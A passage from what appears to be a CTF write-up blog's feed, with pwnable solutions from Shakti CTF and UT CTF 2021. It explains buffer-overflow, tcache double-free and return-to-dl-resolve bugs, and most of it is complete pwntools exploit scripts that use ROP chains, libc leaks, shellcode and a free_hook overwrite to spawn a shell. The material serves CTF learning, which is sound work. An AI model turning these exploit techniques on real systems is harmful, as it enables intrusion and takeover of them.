class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 2222)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">size = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x00400c03</span></span><br><span class="line">prsi = <span class="number">0x00400c01</span></span><br><span class="line">main = <span class="number">0x400b32</span></span><br><span class="line"></span><br><span class="line">put_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;to: &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">    vuln()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(put_got)</span><br><span class="line">payload += p64(put_plt)</span><br><span class="line">payload += p64(<span class="number">0x4008e7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase = leak - <span class="number">0x80aa0</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase  + <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Choice &gt; &#x27;,&#x27;3&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Returning-2-pwnable"><a href="#Returning-2-pwnable" class="headerlink" title="Returning-2 (pwnable)"></a>Returning-2 (pwnable)</h1><h2 id="vulnerability-2"><a href="#vulnerability-2" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png" alt="CTF8"></p><p>Check Protection,  No canary~</p><p><img src="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png" alt="CTF9"></p><p>It is Buffer overflow vulnerability. and also i could allocate dynamically on stack using <code>alloca</code> functions. </p><p><img src="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png" alt="CTF10"></p><p>I could find that i can make buffer address to read  <code>rsp</code>, when  the alloca’s size is <code>-30</code>.<br>Lastly I use ROP to exploit.</p><h2 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 3333)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601500</span></span><br><span class="line">push_rsp = e.symbols[<span class="string">&#x27;push_rsp&#x27;</span>]</span><br><span class="line">mov = <span class="number">0x0400774</span></span><br><span class="line">prax = <span class="number">0x040079a</span></span><br><span class="line">prdi = <span class="number">0x040077f</span></span><br><span class="line">prsi = <span class="number">0x0400791</span></span><br><span class="line">prdx = <span class="number">0x0400788</span></span><br><span class="line">syscall = <span class="number">0x04007a3</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(mov)</span><br><span class="line">payload += p64(prdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;text:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bye!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Cache-7-pwnable"><a href="#Cache-7-pwnable" class="headerlink" title="Cache_7 (pwnable)"></a>Cache_7 (pwnable)</h1><h2 id="vulnerability-3"><a href="#vulnerability-3" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png" alt="CTF11"></p><p>I can’t overwrite plt.got because it is FULL RELRO. I am gonna overwrite _hook address.</p><p>Let’s analyze the binary.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png" alt="123"></p><p>Allocate heap memory  here.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png" alt="456"></p><p>Free the memory here.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png" alt="789"></p><p>And can leak the memory using this.</p><p>You know, there is vulnerability about <code>Tcache double free</code> in Ubuntu 18.04 before patching.</p><p>And also they gave me the Libc file. It is Libc-2.27, and they gave hint . “Old Ubuntu 18.04”.</p><p><img src="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png" alt="1010"></p><p>I tested about it . First I allocated 0x40 size heap. and free the memory three times. The picture above shows that double free is possible.<br>There is no protection about <code>double free</code> in Ubuntu 18.04, but it is patched now.  </p><p>Then it is easy to exploit. I use this vulnerability i can leak the memory and also overwrite _hook address. </p><h2 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;,4444)</span></span><br><span class="line">p = process([<span class="string">&#x27;./chall&#x27;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601050</span></span><br><span class="line">stdin = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data\n&#x27;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">50</span>,p64(stdin))</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;inside\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak = leak + <span class="number">0x76</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ec680</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3c2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">60</span>,p64(oneshot))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/04/04/2021-04-03-Shakti_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 UT CTF</title>
      <link>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/</guid>
      <pubDate>Fri, 12 Mar 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 UT CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;2SMOL-pwnable&quot;&gt;&lt;a href=&quot;#2SMOL-pwnable&quot; class=&quot;headerlink&quot; title=&quot;2SMOL (pwnable)&quot;&gt;&lt;/a&gt;2SMOL (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;First, Check the protection. All of protection is turned off. &lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 UT CTF Write-up </center><h1 id="2SMOL-pwnable"><a href="#2SMOL-pwnable" class="headerlink" title="2SMOL (pwnable)"></a>2SMOL (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png" alt="3"></p><p>First, Check the protection. All of protection is turned off. </p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png" alt="1"></p><p><img src="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png" alt="2"></p><p>It called only <code>read</code>functions. but the size of read is bigger than buffer. It is Buffer OverFlow.<br>And NXbit is turned off, So I can use shellcode to exploit.</p><p><img src="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png" alt="4"></p><p>But we only have 0x8 size to write. It is not enough to write shellcode on the stack, and also even if we can write shellcode on the stack, we can’t leak the stack address. </p><p><img src="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png" alt="6"></p><p>So we have to write on memory which we know address. It is <code>0x402000</code>. We can change the flow by using <code>leave ret</code> gadgets. then  we can write shellcode on memory. Lastly, overwrite return address to shellcode’s address.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.utctf.live&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smol&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./smol&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x402018</span></span><br><span class="line">fakerbp = <span class="number">0x402068</span></span><br><span class="line">syscall = <span class="number">0x40103d</span></span><br><span class="line">before_read = <span class="number">0x401015</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fakerbp)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x402028</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="resolve-pwnable"><a href="#resolve-pwnable" class="headerlink" title="resolve (pwnable)"></a>resolve (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png" alt="1"></p><p>First, Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p><p><img src="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png" alt="2"></p><p>The main function only call <code>get@plt</code>. It can occur overflow here. But there is no way to leak libc address and also doesn’t have system functions which can call <code>/bin/sh</code> in binary. But the method for exploit can be inferred from the name of the problem. The name is <code>resolve</code>. So i used <code>return-to-dl-resolve</code>. </p><p>If you don’t know well about this, Please refer to the reference.</p><blockquote><p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></p></blockquote><p>Then let’s find gadgets for exploit.</p><p><img src="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png" alt="3"></p><p>There is <code>get</code>function. so i only need to control <code>rdi</code> for calling function. </p><p><img src="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png" alt="55"></p><p>And get section address what i need. like <code>plt</code>, <code>bss</code>, <code>dynsym</code>, <code>dynstr</code>, <code>rela.plt</code>…</p><p>Using <code>ROP</code>, make fake structure which is used by <code>lazy binding</code> and write on the memory which i know address. </p><p><img src="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png" alt="66"></p><p>In my case, I wrote on 0x404508. The red is fake structure of <strong>Elf64_Rela</strong>. And the orange is about <strong>Elf64_Sym</strong>. The last things are <code>system</code> and <code>/bin/sh</code>. </p><p>After making fake structure, The system function is executed by invoking the <code>plt</code>.</p><p><img src="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png" alt="8"></p><p>Finally, I can call <code>system(/bin/sh/)</code> </p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 zer0pts CTF</title>
      <link>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/</guid>
      <pubDate>Sat, 06 Mar 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 zer0pts CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;Not-Beginner’s-Stack-pwnable&quot;&gt;&lt;a href=&quot;#Not-Beginner’s-Stack-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Not Beginner’s Stack (pwnable)&quot;&gt;&lt;/a&gt;Not Beginner’s Stack (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;Let’s check the protection of the binary.&lt;br&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png&quot; alt=&quot;899&quot;&gt;&lt;br&gt;You can find that all protection is turned off.&lt;/p&gt;</description>
      
      
      
